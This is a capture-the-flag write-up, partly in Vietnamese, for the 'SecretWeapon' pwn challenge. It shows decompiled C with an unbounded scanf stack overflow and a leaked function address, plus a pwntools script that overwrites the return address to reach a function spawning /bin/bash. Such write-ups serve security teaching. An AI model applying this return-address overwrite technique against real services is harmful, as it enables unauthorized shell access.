# **SecretWeapon**

## Task
nc 61.28.237.24 30201

File: weapon

## Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup();
  townsquare();
  return 0;
}
```

```c
int townsquare()
{
  char v1[20]; // [esp+0h] [ebp-18h] BYREF

  puts("You wanna open the arsenal. Tell me the passphrase!");
  printf("Your current location is townsquare with the address %p \n", townsquare);
  return __isoc99_scanf("%s", v1);
}
```

```c
int arsenal()
{
  return run_cmd("/bin/bash");
}
```

Bài này đơn giản sẽ là overwrite địa chỉ trả về của hàm `townsquare` với địa chỉ của hàm `arsenal` để gọi bash shell

## Exploit
python code

```python
from pwn import *

binary = context.binary = ELF('./weapon')

p = process('./weapon')
#p = remote('61.28.237.24','30201')

p.recvuntil('Your current location is townsquare with the address ')

# lấy địa chỉ của hàm townsquare
add_curr = p.recvline().strip()

# chuyển string sang int
add = int(add_curr, 16)


# padding từ biến nhập vào đến địa chỉ trả về
payload = b'A'*(0x18+0x4)

# tính offset khoảng cách địa chỉ local và địa chỉ trên server từ địa chỉ townsquare vừa nhận được
offset = add - binary.sym.townsquare


# nối vào payload địa chỉ mới của hàm arsenal từ offset vừa tính
payload += p32(binary.sym.arsenal+offset)

p.sendline(payload)

p.interactive()

```

## Run scripts
vì server đã đóng nên mình tiến hành khai thác local với file flag.txt HCMUSCTF{SecretWeapon}

![image](https://user-images.githubusercontent.com/31529599/120056671-06e90b80-c068-11eb-84ba-cd7154137998.png)

Xong !

